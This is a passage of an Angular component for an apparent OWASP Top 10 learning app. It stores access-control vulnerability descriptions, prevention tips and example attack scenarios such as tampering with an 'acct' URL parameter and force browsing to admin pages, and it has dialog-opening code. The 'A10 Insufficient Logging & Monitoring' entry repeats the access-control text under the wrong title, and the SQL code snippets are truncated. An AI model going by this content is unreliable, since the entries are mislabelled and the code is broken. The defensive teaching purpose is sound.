  internal application state, or the HTML page, or simply using a
  custom API attack tool.
  •
  Allowing the primary key to be changed to another users
  record, permitting viewing or editing someone else's account.
  •
  Elevation of privilege. Acting as a user without being logged in,
  or acting as an admin when logged in as a user.
  •
  Metadata manipulation, such as replaying or tampering with a
  JSON Web Token ( JWT access control token or a cookie or
  hidden field manipulated to elevate privileges, or abusing JWT
  invalidation
  •
  CORS misconfiguration allows unauthorized API access.
  •
  Force browsing to authenticated pages as an unauthenticated
  user or to privileged pages as a standard user. Accessing API
  with missing access controls for POST, PUT and DELETE.`,
    prevention: `Access control is only effective if enforced in trusted server
  side
  code or server less API, where the attacker cannot modify the
  access control check or metadata.
  •
  With the exception of public resources, deny by default.
  •
  Implement access control mechanisms once and re use them
  throughout the application, including minimizing CORS usage.
  •
  Model access controls should enforce record ownership, rather
  than accepting that the user can create, read, update, or delete
  any record.
  •
  Unique application business limit requirements should be
  enforced by domain models.
  •
  Disable web server directory listing and ensure file metadata
  (e.g. .git) and backup files are not present within web
  •
  Log access control failures, alert admins when appropriate
  (e.g. repeated
  •
  Rate limit API and controller access to minimize the harm from
  automated attack tooling.
  •
  JWT tokens should be invalidated on the server after logout.
  Developers and QA staff should include functional access control
  unit and integration tests.`,

    example: `Scenario #1
  : The application uses unverified data in a SQL call
  that is accessing account information:
  pstmt.setString
  (1, request.getParameter ("
  ResultSet
  results = pstmt.executeQuery (
  An attacker simply modifies the 'acct' parameter in the browser to
  send whatever account number they want. If not properly
  verified, the attacker can access any user's account.
  http://example.com/app/accountInfo?acct=
  notmyacct
  Scenario #2
  : An attacker simply force browses to target URLs.
  Admin rights are required for access to the admin page.
  http://example.com/app/getappInfo
  http://example.com/app/
  admin_getappInfo
  If an unauthenticated user can access either page, it’s a flaw. If a
  non admin can access the admin page, this is a flaw.`,

  },
  {
    title: 'A10 : Insufficient Logging & Monitoring',
    subtitle: `Exploitation of access control is a
  core skill of attackers. SAST and
  DAST tools can detect the absence of
  access control but cannot verify if it is
  functional when it is present. Access
  control is detectable using manual
  means, or possibly through
  automation for the absence of access
  controls in certain frameworks.`,
    isVulnerablePara: `Access control enforces policy such that users cannot act
  outside of their intended permissions. Failures typically lead to
  unauthorized information disclosure, modification or destruction
  of all data, or performing a business function outside of the limits
  of the user. Common access control vulnerabilities include:
  •
  Bypassing access control checks by modifying the URL,
  internal application state, or the HTML page, or simply using a
  custom API attack tool.
  •
  Allowing the primary key to be changed to another users
  record, permitting viewing or editing someone else's account.
  •
  Elevation of privilege. Acting as a user without being logged in,
  or acting as an admin when logged in as a user.
  •
  Metadata manipulation, such as replaying or tampering with a
  JSON Web Token ( JWT access control token or a cookie or
  hidden field manipulated to elevate privileges, or abusing JWT
  invalidation
  •
  CORS misconfiguration allows unauthorized API access.
  •
  Force browsing to authenticated pages as an unauthenticated
  user or to privileged pages as a standard user. Accessing API
  with missing access controls for POST, PUT and DELETE.`,
    prevention: `Access control is only effective if enforced in trusted server
  side
  code or server less API, where the attacker cannot modify the
  access control check or metadata.
  •
  With the exception of public resources, deny by default.
  •
  Implement access control mechanisms once and re use them
  throughout the application, including minimizing CORS usage.
  •
  Model access controls should enforce record ownership, rather
  than accepting that the user can create, read, update, or delete
  any record.
  •
  Unique application business limit requirements should be
  enforced by domain models.
  •
  Disable web server directory listing and ensure file metadata
  (e.g. .git) and backup files are not present within web
  •
  Log access control failures, alert admins when appropriate
  (e.g. repeated
  •
  Rate limit API and controller access to minimize the harm from
  automated attack tooling.
  •
  JWT tokens should be invalidated on the server after logout.
  Developers and QA staff should include functional access control
  unit and integration tests.`,

    example: `Scenario #1
  : The application uses unverified data in a SQL call
  that is accessing account information:
  pstmt.setString
  (1, request.getParameter ("
  ResultSet
  results = pstmt.executeQuery (
  An attacker simply modifies the 'acct' parameter in the browser to
  send whatever account number they want. If not properly
  verified, the attacker can access any user's account.
  http://example.com/app/accountInfo?acct=
  notmyacct
  Scenario #2
  : An attacker simply force browses to target URLs.
  Admin rights are required for access to the admin page.
  http://example.com/app/getappInfo
  http://example.com/app/
  admin_getappInfo
  If an unauthenticated user can access either page, it’s a flaw. If a
  non admin can access the admin page, this is a flaw.`,

  },

  ];
  constructor(
    private embedService: EmbedVideoService,
    public dialog: MatDialog
  ) {
    this.videoList.forEach(video => {
      this.iframeList.push(this.embedService.embed(video));
    });
  }

  ngOnInit() {
  }


  openDialog(x, content): void {
    if (x == 1) {
      const dialogRef = this.dialog.open(DialogComponentComponent, {
        width: '70em',
        height: 'auto',
        data: {
          title: content.title,
          isVulnerablePara: content.isVulnerablePara,
          prevention: content.prevention,
          subtitle: content.subtitle,

          example: content.example,
        }
      });

      dialogRef.afterClosed().subscribe(result => {
      });
    } else if (x == 2) {
      const dialogRef = this.dialog.open(DialogComponentComponent, {
        width: '70em',
        height: 'auto',
        data: {
          title: content.title,
          isVulnerablePara: content.prevention,
          subtitle: '',
          prevention: content.prevention,
          example: content.example,
        }
      });

      dialogRef.afterClosed().subscribe(result => {
      });

    } else if (x == 3) {
      const dialogRef = this.dialog.open(DialogComponentComponent, {
        width: '70em',
        height: 'auto',
        data: {
          title: content.title,
          subtitle: '',
          isVulnerablePara: content.example,
          prevention: content.prevention,
          example: content.example,
        }
      });

      dialogRef.afterClosed().subscribe(result => {
      });
    }

  }

}
